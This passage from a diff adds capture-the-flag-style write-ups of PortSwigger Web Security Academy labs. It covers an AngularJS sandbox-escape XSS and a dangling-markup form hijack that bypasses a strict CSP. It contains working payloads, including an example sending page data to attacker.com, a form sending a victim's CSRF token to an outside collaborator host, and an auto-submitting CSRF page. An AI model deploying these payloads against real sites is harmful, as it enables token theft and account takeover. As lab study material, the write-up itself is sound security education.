+* `$scope.value = $parse(key)($scope.query);` --> `$parse("search=1&2+2=1")($scope.query)`
+
+**AngularJS $parse is SUPER SMART**:
+
+* **Normal**: $parse("search") → gets query.search
+* **Magic**: $parse("2+2") → **calculates 4**!
+* **Your case**: $parse("search=1&2+2=1") → **evaluates the whole expression**
+
+**WHY =1 is used** `$parse("search=1&2+2=1")($scope)`
+
+* `query.search = 1` → ignored (not used)
+* `2+2=1` → tries to assign → **fails**, but **returns 4**
+* Final result = 4 → **shown on page!**
+
+FINAL XSS Payload
+
+```
+https://0a2e002403f863ec80e903a100dc0072.web-security-academy.net/?search=1&toString%28%29%2Econstructor%2Eprototype%2EcharAt%3D%5B%5D%2Ejoin%3B%20%5B1%2C2%5D%7CorderBy%3AtoString%28%29%2Econstructor%2EfromCharCode%28120%2C61%2C97%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29=1
+```
+
+### Lab 26: Reflected XSS protected by very strict CSP, with dangling markup attack
+
+This lab uses a strict CSP that prevents the browser from loading subresources from external domains.
+
+To solve the lab, perform a form hijacking attack that bypasses the CSP, exfiltrates the simulated victim user's CSRF token, and uses it to authorize changing the email to `hacker@evil-user.net`.
+
+You must label your vector with the word "Click" in order to induce the simulated user to click it. For example:
+
+`<a href="">Click me</a>`
+
+You can log in to your own account using the following credentials: `wiener:peter`
+
+request to change email:
+
+![](<../.gitbook/assets/unknown (102).png>)
+
+Lets understand `Dangling Markup Attack` "Dangling" = unfinished / hanging "Markup" = HTML tags like
+
+**Real Example (Step-by-Step)**
+
+```
+<input type="text" name="search" value="USER_INPUT_HERE">
+```
+
+No escaping of " or >
+
+STEP 1: `"><script>alert(1)</script>` --> Blocked by filter or CSP
+
+STEP 2: `"><img src='//attacker.com/log?` final html becomes
+
+```
+<input type="text" name="search" value=""><img src='https://attacker.com/log?
+[everything after this line gets added to the src URL]
+```
+
+lets say page continues with secret data:
+
+```
+
+<input required type="hidden" name="csrf" value="n79TyhEyRPSLwFF7mzlzcvxw4I2YdeCn">
+<button class='button' type='submit'> Update email </button>
+```
+
+→ Browser keeps reading until it finds the next `'`
+
+The request it will send to the attacker site will be like this (in URL encoded form):
+
+```
+https://attacker.com/log?<input required type="hidden" name="csrf" value="n79TyhEyRPSLwFF7mzlzcvxw4I2YdeCn">
+<button class=
+```
+
+Hence we get the sensitive csrf token.\
+lets implement this theory
+
+**STEP 1: Finding point XSS Vulnerability** `https://0ae3004703c86175806d0322003000b0.web-security-academy.net/my-account?id=wiener`
+
+![](<../.gitbook/assets/unknown (103).png>)
+
+This endpoint `my-account?id=wiener` shows account information. When we pass additional parameter `email`, it pre fills the email in update email section.
+
+![](<../.gitbook/assets/unknown (104).png>)
+
+![](<../.gitbook/assets/unknown (105).png>)
+
+if we pass this value `" ><script>alert(0)</script>`
+
+![](<../.gitbook/assets/unknown (106).png>)
+
+```
+<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
+<label>Email</label>
+<input required type="email" name="email" value="" ><script>alert(0)</script>">
+<input required type="hidden" name="csrf" value="POjdkGFeQub5813k3VlnptTlvZlDu1yn">
+<button class='button' type='submit'> Update email </button>
+</form>
+```
+
+editing form to send data to our server:
+
+```
+"></form><form class="login-form" name="dollarboysushli" action="https://5lrxq3619xtqeq165s0ujkbt0k6bu2ir.oastify.com/csrf" method="GET">
+<button class='button' type='submit'>Click me</button>
+```
+
+![](<../.gitbook/assets/unknown (107).png>)
+
+Explanation:
+
+* We are creating new form which sends the data to our controlled server.
+* The data present inside our newly created form is `csrf` value.
+* So, it sends get request with the `csrf` value to our server
+
+Now sending this to victim.
+
+```
+<script>
+location = "https://0ae3004703c86175806d0322003000b0.web-security-academy.net/my-account?&email=%22%3E%3C/form%3E%3Cform%20class=%22login-form%22%20name=%22dollarboysushli%22%20action=%22https://5lrxq3619xtqeq165s0ujkbt0k6bu2ir.oastify.com/csrf%22%20method=%22GET%22%3E%3Cbutton%20class=%27button%27%20type=%27submit%27%3EClick%20me%3C/button%3E"
+</script>
+```
+
+![](<../.gitbook/assets/unknown (108).png>)
+
+We now have csrf token.
+
+![](<../.gitbook/assets/unknown (109).png>)
+
+Using burp pro we can create CSRF poc in seconds.
+
+```
+<html>
+  <!-- CSRF PoC - generated by Burp Suite Professional -->
+  <body>
+    <form action="https://0ae3004703c86175806d0322003000b0.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="hacker&#64;evil&#45;user&#46;net" />
+      <input type="hidden" name="csrf" value="ggICGH2IddN3iRuUrnROjTgoN8JhTWVX" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
 ```
